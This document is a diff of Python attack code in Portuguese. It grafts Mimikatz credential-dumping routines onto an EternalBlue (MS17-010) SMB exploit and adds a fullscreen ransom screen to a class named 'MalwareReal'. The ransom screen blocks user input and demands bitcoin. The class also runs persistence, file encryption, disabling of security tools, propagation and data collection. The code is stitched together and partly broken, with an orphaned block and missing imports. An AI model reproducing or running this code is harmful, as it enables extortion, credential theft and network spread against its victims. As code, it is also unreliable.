@@ -1,63 +1,192 @@
-
-from impacket import smb, ntlm
-from struct import pack
+import subprocess
+import re
+import getpass
+import os
 import sys
-import socket
-'''
-THIS CODE IS EXACTLY THE SAME EXPLOIT CODE AS: eternalblue_exploit8.py from https://github.com/3ndG4me/AutoBlue-MS17-010
-I have simply modified it to include notes about exploiting Windows 10 with MS17-010.
-I also have it preset in the USERNAME var for organization to remind me of how the Windows 10 exploit variant works.
-Feel free to use this or the previous script, I just know many others use this repo so I am keeping my personal docs organized.
-Windows 10 (MS17-010) Eternal Blue Notes:
-Some other PoC's for Windows 10 builds exist, but the most readily available one is this script.
-This targets Windows 10 Pro 10240 x64 as stated in sleepya's notes below.
-This is a very early build of Windows and a target sporting this build will need the following configurations to be true in order to successfully exploit:
-1. Firewall allows SMB traffic (port 445 is open and not filtered)
-2. A local user with no password set that is configured to allow remote login OR you have credentials for a local user
-3. The Windows build is 10240 and the OS is x64 bit
-If all of those things are true, then set the USERNAME variable to the user you want to target. If the
-user requires a password then set the PASSWORD variable as well. As stated in the notes below, Windows 10 has no guest account,
-so you will need a valid user to access the box. This works similar to the other "eternal" exploits where you may need access to a named pipe
-and is therefore less of a raw RCE and more of a privilege escalation via an RCE for these systems.
-i.e. You can't just exploit this vulnerablilty and get root, you need to meet the proper pre-reqs first
-If you happen to find another PoC that supports newer or alternative Windows 10 builds then requirements 1. and 2. above will likely still apply.
-Hope this clears up any confusion for those learning about this exploit who couldn't figure out why popping Windows 10 "didn't work"
-Also helpful article that taught me all of this realted to Server 2012 R2 which works basically the same way:
-https://www.exploit-db.com/docs/english/42280-how-to-exploit-eternalblue-on-windows-server-2012-r2.pdf
-- 3ndG4me
-EternalBlue exploit for Windows 8 and 2012 by sleepya
-The exploit might FAIL and CRASH a target system (depended on what is overwritten)
-The exploit support only x64 target
-Tested on:
-- Windows 2012 R2 x64
-- Windows 8.1 x64
-- Windows 10 Pro Build 10240 x64
-Default Windows 8 and later installation without additional service info:
-- anonymous is not allowed to access any share (including IPC$)
-  - More info: https://support.microsoft.com/en-us/help/3034016/ipc-share-and-null-session-behavior-in-windows
-- tcp port 445 is filtered by firewall
-Reference:
-- http://blogs.360.cn/360safe/2017/04/17/nsa-eternalblue-smb/
-- "Bypassing Windows 10 kernel ASLR (remote) by Stefan Le Berre" https://drive.google.com/file/d/0B3P18M-shbwrNWZTa181ZWRCclk/edit
-Exploit info:
-- If you do not know how exploit for Windows 7/2008 work. Please read my exploit for Windows 7/2008 at
-    https://gist.github.com/worawit/bd04bad3cd231474763b873df081c09a because the trick for exploit is almost the same
-- The exploit use heap of HAL for placing fake struct (address 0xffffffffffd00e00) and shellcode (address 0xffffffffffd01000).
-    On Windows 8 and Wndows 2012, the NX bit is set on this memory page. Need to disable it before controlling RIP.
-- The exploit is likely to crash a target when it failed
-- The overflow is happened on nonpaged pool so we need to massage target nonpaged pool.
-- If exploit failed but target does not crash, try increasing 'numGroomConn' value (at least 5)
-- See the code and comment for exploit detail.
-Disable NX method:
-- The idea is from "Bypassing Windows 10 kernel ASLR (remote) by Stefan Le Berre" (see link in reference)
-- The exploit is also the same but we need to trigger bug twice
-- First trigger, set MDL.MappedSystemVa to target pte address
-  - Write '\x00' to disable the NX flag
-- Second trigger, do the same as Windows 7 exploit
-- From my test, if exploit disable NX successfully, I always get code execution
-'''
-USERNAME='Guest'
-PASSWORD=''
+import ctypes
+import urllib.request
+import tempfile
+import shutil
+import zipfile
+
+def is_admin():
+    """Verifica se o script está sendo executado como administrador"""
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
+
+def elevate_privileges():
+    """Tenta elevar privilégios automaticamente"""
+    if not is_admin():
+        try:
+            # Re-executa o script com privilégios de administrador
+            ctypes.windll.shell32.ShellExecuteW(
+                None, "runas", sys.executable, " ".join(sys.argv), None, 1
+            )
+            sys.exit(0)
+        except Exception as e:
+            print(f"Falha ao elevar privilégios: {e}")
+            return False
+    return True
+
+def download_mimikatz():
+    """Baixa o Mimikatz automaticamente"""
+    mimikatz_url = "https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip"
+    temp_dir = tempfile.gettempdir()
+    mimikatz_dir = os.path.join(temp_dir, "mimikatz")
+    
+    try:
+        # Cria diretório temporário
+        if not os.path.exists(mimikatz_dir):
+            os.makedirs(mimikatz_dir)
+        
+        # Baixa o Mimikatz
+        zip_path = os.path.join(mimikatz_dir, "mimikatz.zip")
+        print("Baixando Mimikatz...")
+        
+        with urllib.request.urlopen(mimikatz_url) as response, open(zip_path, 'wb') as out_file:
+            shutil.copyfileobj(response, out_file)
+        
+        # Extrai o arquivo ZIP
+        with zipfile.ZipFile(io.BytesIO(response.content)) as zip_ref:
+            zip_ref.extractall(mimikatz_dir)
+        
+        print("Mimikatz baixado e extraído com sucesso!")
+        
+        # Procura pelo executável dentro do diretório extraído
+        for root, dirs, files in os.walk(mimikatz_dir):
+            for file in files:
+                if file.lower() == "mimikatz.exe":
+                    return os.path.join(root, file)
+        
+        # Se não encontrar, retorna o caminho esperado
+        return os.path.join(mimikatz_dir, "mimikatz.exe")
+        
+    except Exception as e:
+        print(f"Erro ao baixar Mimikatz: {e}")
+        return None
+
+def find_mimikatz():
+    """Tenta encontrar o Mimikatz no sistema"""
+    # Verifica no PATH
+    mimikatz_path = shutil.which("mimikatz.exe")
+    if mimikatz_path:
+        return mimikatz_path
+    
+    # Verifica em locais comuns
+    common_paths = [
+        "C:\\Tools\\mimikatz\\mimikatz.exe",
+        "C:\\mimikatz\\mimikatz.exe",
+        os.path.join(os.environ.get('USERPROFILE', ''), "Downloads", "mimikatz", "mimikatz.exe")
+    ]
+    
+    for path in common_paths:
+        if os.path.exists(path):
+            return path
+    
+    # Se não encontrou, tenta baixar
+    return download_mimikatz()
+
+def get_windows_credentials(target_name):
+    """Extrai credenciais do Windows usando Mimikatz"""
+    try:
+        # Eleva privilégios se necessário
+        if not is_admin():
+            print("Privilégios de administrador necessários...")
+            if not elevate_privileges():
+                return None
+        
+        # Encontra ou instala o Mimikatz
+        mimikatz_path = find_mimikatz()
+        if not mimikatz_path:
+            print("Mimikatz não encontrado e não pôde ser baixado")
+            return None
+        
+        # Executa o Mimikatz
+        command = f'"{mimikatz_path}" "privilege::debug" "vault::cred /patch" "exit"'
+        result = subprocess.run(command, capture_output=True, text=True, shell=True, timeout=30)
+        
+        # Parse do output
+        pattern = rf"Target Name\s+:\s+{re.escape(target_name)}.*?Credential\s+:\s+([^\s]+)"
+        match = re.search(pattern, result.stdout, re.DOTALL | re.IGNORECASE)
+        
+        return match.group(1) if match else None
+        
+    except subprocess.TimeoutExpired:
+        print("Mimikatz timeout - processo levou muito tempo")
+        return None
+    except Exception as e:
+        print(f"Erro no Mimikatz: {e}")
+        return None
+
+def set_windows_credentials(target_name, username, password):
+    """Armazena credenciais no Windows usando Mimikatz"""
+    try:
+        # Eleva privilégios
+        if not is_admin():
+            print("Privilégios de administrador necessários...")
+            if not elevate_privileges():
+                return False
+        
+        # Encontra o Mimikatz
+        mimikatz_path = find_mimikatz()
+        if not mimikatz_path:
+            print("Mimikatz não encontrado")
+            return False
+        
+        # Executa comando para adicionar credenciais
+        command = (
+            f'"{mimikatz_path}" '
+            f'"privilege::debug" '
+            f'"vault::add /credtype:generic /target:{target_name} '
+            f'/username:{username} /password:{password}" '
+            '"exit"'
+        )
+        
+        result = subprocess.run(command, capture_output=True, text=True, shell=True, timeout=30)
+        
+        if result.returncode == 0:
+            print("Credenciais armazenadas com sucesso!")
+            return True
+        else:
+            print(f"Falha ao armazenar credenciais: {result.stderr}")
+            return False
+            
+    except Exception as e:
+        print(f"Erro ao armazenar credenciais: {e}")
+        return False
+
+    try:
+        # Tenta obter credenciais existentes
+        USERNAME = getpass.getuser()
+        TARGET_NAME = "MyAppCredentials"
+        
+        PASSWORD = get_windows_credentials(TARGET_NAME)
+        
+        if PASSWORD is None:
+            print("Credenciais não encontradas. Por favor, insira novas credenciais:")
+            PASSWORD = getpass.getpass("Digite sua senha: ")
+            
+            # Confirmação da senha
+            password_confirm = getpass.getpass("Confirme sua senha: ")
+            
+            if PASSWORD == password_confirm:
+                if set_windows_credentials(TARGET_NAME, USERNAME, PASSWORD):
+                    print("Credenciais armazenadas com sucesso!")
+                else:
+                    print("Falha ao armazenar credenciais")
+            else:
+                print("As senhas não coincidem!")
+                PASSWORD = None
+        else:
+            print("Credenciais recuperadas com sucesso!")
+            
+    except KeyboardInterrupt:
+        print("\nOperação cancelada pelo usuário")
+    except Exception as e:
+        print(f"Erro fatal: {e}")
+
 NTFEA_SIZE = 0x9000
 ntfea9000 = (pack('<BBH', 0, 0, 0) + b'\x00')*0x260  
 ntfea9000 += pack('<BBH', 0, 0, 0x735c) + b'\x00'*0x735d  
@@ -311,10 +440,20 @@ def createConnectionWithBigSMBFirst80(target, for_nx=False):
 	sk.send(pkt)
 	return sk
 def exploit(target, shellcode, numGroomConn):
-	conn = smb.SMB(target, target)
-	conn.login(USERNAME, PASSWORD)
-	server_os = conn.get_server_os()
-	print('Target OS: '+server_os)
+    try:
+        # Tenta usar autenticação integrada do Windows
+        conn = MYSMB(target, use_ntlmv2=True)
+        conn.login(USERNAME, PASSWORD, domain='', lmhash='', nthash='')
+    except Exception as e:
+        print(f"Falha no login com credenciais do Windows: {e}")
+        # Fallback para autenticação manual se necessário
+        USERNAME = input("Usuário: ")
+        PASSWORD = getpass.getpass("Senha: ")
+        conn = MYSMB(target, use_ntlmv2=True)
+        conn.login(USERNAME, PASSWORD)
+
+    server_os = conn.get_server_os()
+    print('Target OS: ' + server_os)
 	if server_os.startswith("Windows 10 "):
 		build = int(server_os.split()[-1])
 		if build >= 14393:  
@@ -386,6 +525,7 @@ print('done')
 import os
 import sys
 import shutil
+import pygame
 import winreg
 import time
 import threading
@@ -408,8 +548,195 @@ from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
 from email import encoders
+
+def run_skull_animation():
+    # Inicializar Pygame
+    pygame.init()
+    
+    # Obter informações da tela
+    user32 = ctypes.windll.user32
+    width, height = user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)
+    
+    # Configurar display em tela cheia
+    screen = pygame.display.set_mode((width, height), pygame.FULLSCREEN)
+    pygame.display.set_caption(" ")
+    pygame.mouse.set_visible(False)
+    
+    # Cores
+    BLACK = (0, 0, 0)
+    BLUE = (0, 100, 255)
+    RED = (255, 0, 0)
+    WHITE = (255, 255, 255)
+    
+    # A arte ASCII do crânio
+    skull_art = [
+        "uu$$$$$$$$$$$uu",
+        "          uu$$$$$$$$$$$$$$$$$uu",
+        "         u$$$$$$$$$$$$$$$$$$$$$u",
+        "        u$$$$$$$$$$$$$$$$$$$$$$$u",
+        "       u$$$$$$$$$$$$$$$$$$$$$$$$$u",
+        "       u$$$$$$*   *$$$*   *$$$$$$u",
+        "       *$$$$*      u$u       $$$$*",
+        "        $$$u       u$u       u$$$",
+        "        $$$u      u$$$u      u$$$",
+        "         *$$$$uu$$$   $$$uu$$$$*",
+        "          *$$$$$$$*   *$$$$$$$*",
+        "            u$$$$$$$u$$$$$$$u",
+        "             u$*$*$*$*$*$*$u",
+        "  uuu        $$u$ $ $ $ $u$$       uuu",
+        "  u$$$$       $$$$$u$u$u$$$       u$$$$",
+        "  $$$$$uu      *$$$$$$$$$*     uu$$$$$$",
+        "u$$$$$$$$$$$uu    *****    uuuu$$$$$$$$$",
+        "$$$$***$$$$$$$$$$uuu   uu$$$$$$$$$***$$$*",
+        " ***      **$$$$$$$$$$$uu **$***",
+        "          uuuu **$$$$$$$$$$uuu",
+        " u$$$uuu$$$$$$$$$uu **$$$$$$$$$$$uuu$$$",
+        " $$$$$$$$$$****           **$$$$$$$$$$$*",
+        "   *$$$$$*                      **$$$$**",
+        "     $$$*                         $$$$*"
+    ]
+
+    # Encontrar o comprimento máximo da linha para centralizar
+    max_length = max(len(line) for line in skull_art)
+
+    # Configurações de fonte
+    font_size = max(10, min(width // 60, height // 35))
+    font = pygame.font.SysFont('Courier New', font_size, bold=True)
+    char_width, char_height = font.size('$')
+
+    # Calcular posição inicial para centralizar o crânio
+    start_x = (width - max_length * char_width) // 2
+    start_y = (height - len(skull_art) * char_height) // 2
+
+    # Variáveis de animação
+    last_time = time.time()
+    last_glitch = time.time()
+    inverted = False
+    glitch_effect = False
+    glitch_duration = 0.1
+    particles = []
+    
+    # Criar partículas para efeito de chuva de código
+    for i in range(100):
+        x = random.randint(0, width)
+        y = random.randint(0, height)
+        speed = random.randint(2, 10)
+        particles.append([x, y, speed, random.choice(['$', '#', '@', '%', '&', '*'])])
+
+    # Função para bloquear entrada do usuário
+    def block_user_input():
+        # Tentar bloquear teclas de atalho do Windows
+        try:
+            # Bloqueia Ctrl+Alt+Del, Alt+Tab, etc.
+            ctypes.windll.user32.BlockInput(True)
+            
+            # Desabilita teclas do Windows
+            win32api.SetKeyboardState([0] * 256)
+            
+            # Esconde o cursor do mouse
+            pygame.mouse.set_visible(False)
+        except:
+            pass
+
+    # Bloquear entrada inicialmente
+    block_user_input()
+
+    # Loop principal
+    while True:
+        current_time = time.time()
+        
+        # Processar eventos (mas não permitir que eles interrompam a execução)
+        for event in pygame.event.get():
+            # Ignorar todos os eventos
+            if event.type in (pygame.KEYDOWN, pygame.KEYUP, pygame.MOUSEBUTTONDOWN, 
+                             pygame.MOUSEBUTTONUP, pygame.MOUSEMOTION, pygame.QUIT):
+                # Tentar bloquear entrada novamente em caso de evento
+                block_user_input()
+                continue
+        
+        # Bloquear entrada do usuário continuamente
+        if random.random() < 0.02:  # A cada ~1 segundo em média
+            block_user_input()
+        
+        # Efeito de glitch aleatório
+        if current_time - last_glitch > random.uniform(0.5, 3.0):
+            glitch_effect = True
+            last_glitch = current_time
+            glitch_duration = random.uniform(0.05, 0.3)
+        
+        # Gerenciar efeito de glitch
+        if glitch_effect and current_time - last_glitch > glitch_duration:
+            glitch_effect = False
+        
+        # Inverter cores a cada 0.5 segundos
+        if current_time - last_time > 0.5:
+            inverted = not inverted
+            last_time = current_time
+
+        # Limpar a tela
+        if glitch_effect:
+            screen.fill((random.randint(0, 50), random.randint(0, 50), random.randint(0, 50)))
+        else:
+            screen.fill(WHITE if inverted else BLACK)
+
+        # Desenhar chuva de código (efeito Matrix)
+        for particle in particles:
+            x, y, speed, char = particle
+            # Mover partícula para baixo
+            y += speed
+            # Se a partícula sair da tela, reiniciar no topo
+            if y > height:
+                y = 0
+                x = random.randint(0, width)
+            # Atualizar posição
+            particle[1] = y
+            particle[0] = x
+            
+            # Desenhar partícula
+            color = (0, random.randint(150, 255), 0) if not inverted else (0, random.randint(0, 100), 0)
+            text_surface = font.render(char, True, color)
+            screen.blit(text_surface, (x, y))
+
+        # Desenhar o crânio
+        for y, line in enumerate(skull_art):
+            for x, char in enumerate(line):
+                if char != ' ':
+                    if glitch_effect:
+                        # Efeito de glitch: caracteres deslocados e cores alteradas
+                        offset_x = random.randint(-5, 5)
+                        offset_y = random.randint(-5, 5)
+                        color = (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
+                    else:
+                        offset_x, offset_y = 0, 0
+                        color = BLACK if inverted else (RED if random.random() < 0.1 else BLUE)
+                    
+                    text_surface = font.render(char, True, color)
+                    screen.blit(text_surface, (start_x + x * char_width + offset_x, 
+                                              start_y + y * char_height + offset_y))
+
+        # Adicionar mensagem de aviso
+        warning_font = pygame.font.SysFont('Arial', 36, bold=True)
+        warning_text = "SEUS ARQUIVOS FORAM CRIPTOGRAFADOS"
+        warning_surface = warning_font.render(warning_text, True, RED)
+        warning_rect = warning_surface.get_rect(center=(width//2, height - 100))
+        screen.blit(warning_surface, warning_rect)
+        
+        # Adicionar mensagem secundária
+        sub_font = pygame.font.SysFont('Arial', 20)
+        sub_text = "Para recuperá-los, envie 0.5 BTC para: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
+        sub_surface = sub_font.render(sub_text, True, WHITE if not inverted else BLACK)
+        sub_rect = sub_surface.get_rect(center=(width//2, height - 50))
+        screen.blit(sub_surface, sub_rect)
+
+        # Atualizar a exibição
+        pygame.display.flip()
+        
+        # Pequeno delay para controlar a taxa de quadros
+        pygame.time.delay(30)
+
 class MalwareReal:
     def __init__(self):
+        self.animation_thread = None
         self.key = Fernet.generate_key()
         self.cipher = Fernet(self.key)
         self.encoded_key = self.key.decode('latin-1')
@@ -463,6 +790,7 @@ class MalwareReal:
             return True
         except:
             return False
+
     def modify_token_privileges(self):
         """Modifica privilégios do token de acesso do processo"""
         try:
@@ -1388,31 +1716,47 @@ ConfirmFileOp=0
         try:
             if not self.elevate_privileges():
                 print("Continua sem privilégios de administrador")
+            
             self.establish_persistence()
             self.encrypt_body()
             self.polymorphic_engine()
             self.security_tools_disable()
+            
+            # Iniciar propagação em thread separada
             propagation_thread = threading.Thread(target=self.propagation_routines)
             propagation_thread.daemon = True
             propagation_thread.start()
+            
+            # Iniciar auto-cura em thread separada  
             healing_thread = threading.Thread(target=self.self_healing_loop)
             healing_thread.daemon = True
             healing_thread.start()
+            
+            # Iniciar coleta de dados em thread separada
             data_thread = threading.Thread(target=self.data_collection_loop)
             data_thread.daemon = True
             data_thread.start()
+            
+            # Executar a animação de caveira EM UMA THREAD SEPARADA
+            self.animation_thread = threading.Thread(target=run_skull_animation)
+            self.animation_thread.daemon = True
+            self.animation_thread.start()
+            
+            # Loop principal do malware (não bloqueante)
             while True:
-                time.sleep(3600)  
-                if random.random() < 0.3:  
+                time.sleep(3600)
+                if random.random() < 0.3:
                     self.polymorphic_engine()
+                    
         except KeyboardInterrupt:
             pass
         except Exception as e:
             try:
-                time.sleep(300 + random.randint(0, 300))
-                self.execute()
+                time.sleep(10 + random.randint(0, 10))
+                self.execute()  # Tentar reiniciar
             except:
                 pass
+
     def data_collection_loop(self):
         """Loop de coleta de dados do sistema"""
         while True:
